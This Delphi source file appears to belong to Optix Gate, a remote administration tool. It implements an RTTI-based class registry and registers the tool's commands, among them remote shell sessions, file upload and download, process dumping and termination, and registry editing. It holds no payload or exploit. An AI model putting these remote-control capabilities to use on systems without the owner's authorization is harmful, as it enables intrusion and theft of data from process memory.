{******************************************************************************}
{                                                                              }
{         ____             _     ____          _           ____                }
{        |  _ \  __ _ _ __| | __/ ___|___   __| | ___ _ __/ ___|  ___          }
{        | | | |/ _` | '__| |/ / |   / _ \ / _` |/ _ \ '__\___ \ / __|         }
{        | |_| | (_| | |  |   <| |__| (_) | (_| |  __/ |   ___) | (__          }
{        |____/ \__,_|_|  |_|\_\\____\___/ \__,_|\___|_|  |____/ \___|         }
{                             Project: Optix Gate                              }
{                                                                              }
{                                                                              }
{                   Author: DarkCoderSc (Jean-Pierre LESUEUR)                  }
{                   https://www.twitter.com/darkcodersc                        }
{                   https://bsky.app/profile/darkcodersc.bsky.social           }
{                   https://github.com/darkcodersc                             }
{                   License: GPL v3                                            }
{                                                                              }
{                                                                              }
{                                                                              }
{  Disclaimer:                                                                 }
{  -----------                                                                 }
{    We are doing our best to prepare the content of this app and/or code.     }
{    However, The author cannot warranty the expressions and suggestions       }
{    of the contents, as well as its accuracy. In addition, to the extent      }
{    permitted by the law, author shall not be responsible for any losses      }
{    and/or damages due to the usage of the information on our app and/or      }
{    code.                                                                     }
{                                                                              }
{    By using our app and/or code, you hereby consent to our disclaimer        }
{    and agree to its terms.                                                   }
{                                                                              }
{    Any links contained in our app may lead to external sites are provided    }
{    for convenience only.                                                     }
{    Any information or statements that appeared in these sites or app or      }
{    files are not sponsored, endorsed, or otherwise approved by the author.   }
{    For these external sites, the author cannot be held liable for the        }
{    availability of, or the content located on or through it.                 }
{    Plus, any losses or damages occurred from using these contents or the     }
{    internet generally.                                                       }
{                                                                              }
{                                                                              }
{  Authorship (No AI):                                                         }
{  -------------------                                                         }
{   All code contained in this unit was written and developed by the author    }
{   without the assistance of artificial intelligence systems, large language  }
{   models (LLMs), or automated code generation tools. Any external libraries  }
{   or frameworks used comply with their respective licenses.	                 }
{                                                                              }
{******************************************************************************}



unit Optix.ClassesRegistry;

interface

// ---------------------------------------------------------------------------------------------------------------------
uses
  System.Classes, System.SysUtils, System.Rtti, System.TypInfo,

  Generics.Collections;
// ---------------------------------------------------------------------------------------------------------------------

type
  TClassesRegistry = class
  private
    class var FRegisteredClasses : TDictionary<String, TClass>;
  public
    {@C}
    class constructor Create();
    class destructor Destroy();

    {@M}
    class function CreateInstance(const AClassName: String; const AParams: array of TValue) : TObject; static;
    class procedure RegisterClass(const AClass : TClass); static;
  end;

implementation

// ---------------------------------------------------------------------------------------------------------------------
uses
  Optix.Func.Commands.FileSystem, Optix.Func.Commands.Process, Optix.Func.Commands, Optix.Func.Commands.Shell,
  Optix.Task.ProcessDump, Optix.Func.Commands.Base, Optix.Func.SessionInformation, Optix.Func.LogNotifier,
  Optix.Func.Commands.Registry, Optix.Func.Commands.ContentReader;
// ---------------------------------------------------------------------------------------------------------------------

class constructor TClassesRegistry.Create();
begin
  FRegisteredClasses := TDictionary<String, TClass>.Create();
end;

class destructor TClassesRegistry.Destroy();
begin
  if Assigned(FRegisteredClasses) then
    FreeAndNil(FRegisteredClasses);
end;

class function TClassesRegistry.CreateInstance(const AClassName: String; const AParams: array of TValue) : TObject;
begin
  result := nil;
  ///

  if not Assigned(FRegisteredClasses) or (FRegisteredClasses.Count = 0) then
    Exit();
  ///

  var AClass : TClass;
  if not FRegisteredClasses.TryGetValue(AClassName, AClass) then
    Exit();
  ///

  var AContext := TRttiContext.Create();

  var AType := AContext.GetType(AClass);

  for var AMethod in AType.GetMethods() do begin
    if not AMethod.IsConstructor then
      continue;
    ///

    var AParameters := AMethod.GetParameters();
    if Length(AParameters) = Length(AParams) then begin
      for var I := Low(AParameters) to High(AParameters) do begin
        if AParams[I].IsType(AParameters[I].ParamType.Handle) then begin
          result := AMethod.Invoke(AClass, AParams).AsObject();

          break;
        end;
      end;

      if Assigned(result) then
        break;
    end;
  end;
end;

class procedure TClassesRegistry.RegisterClass(const AClass : TClass);
begin
  if Assigned(FRegisteredClasses) and not FRegisteredClasses.ContainsKey(AClass.ClassName) then
    FRegisteredClasses.Add(AClass.ClassName, AClass);
end;

initialization
  (* Commands *)

  // General
  TClassesRegistry.RegisterClass(TOptixCommandTerminateCurrentProcess);
  TClassesRegistry.RegisterClass(TOptixCommandReceiveSessionInformation);

  // File System Commands
  TClassesRegistry.RegisterClass(TOptixCommandReceiveFileInformation);
  TClassesRegistry.RegisterClass(TOptixCommandGetUploadedFileInformation);
  TClassesRegistry.RegisterClass(TOptixCommandEnumDrives);
  TClassesRegistry.RegisterClass(TOptixCommandEnumDirectoryFiles);
  TClassesRegistry.RegisterClass(TOptixCommandDownloadFile);
  TClassesRegistry.RegisterClass(TOptixCommandUploadFile);

  // System & Process Commands
  TClassesRegistry.RegisterClass(TOptixCommandTerminateProcess);
  TClassesRegistry.RegisterClass(TOptixCommandDumpProcess);
  TClassesRegistry.RegisterClass(TOptixCommandEnumRunningProcesses);

  // Shell Commands
  TClassesRegistry.RegisterClass(TOptixCommandCreateShellInstance);
  TClassesRegistry.RegisterClass(TOptixCommandDeleteShellInstance);
  TClassesRegistry.RegisterClass(TOptixCommandSigIntShellInstance);
  TClassesRegistry.RegisterClass(TOptixCommandWriteShellInstance);
  TClassesRegistry.RegisterClass(TOptixCommandReadShellInstance);

  // Logs
  TClassesRegistry.RegisterClass(TOptixCommandReceiveLogMessage);
  TClassesRegistry.RegisterClass(TOptixCommandReceiveTransferException);

  // Registry Manager
  TClassesRegistry.RegisterClass(TOptixCommandEnumRegistryHives);
  TClassesRegistry.RegisterClass(TOptixCommandEnumRegistryKeys);
  TClassesRegistry.RegisterClass(TOptixCommandCreateRegistryKey);
  TClassesRegistry.RegisterClass(TOptixCommandDeleteRegistryKey);
  TClassesRegistry.RegisterClass(TOptixCommandSetRegistryValue);

  // File Readers
  TClassesRegistry.RegisterClass(TOptixCommandCreateFileContentReader);
  TClassesRegistry.RegisterClass(TOptixCommandDeleteContentReader);
  TClassesRegistry.RegisterClass(TOptixCommandGetContentReaderPage);
  TClassesRegistry.RegisterClass(TOptixCommandReadContentReaderPageFirstPage);
  TClassesRegistry.RegisterClass(TOptixCommandReadContentReaderPage);

  (* Tasks *)

  TClassesRegistry.RegisterClass(TOptixTaskResult);
  TClassesRegistry.RegisterClass(TOptixTaskCallback);
  TClassesRegistry.RegisterClass(TOptixTaskGetProcessDumpResult);

end.
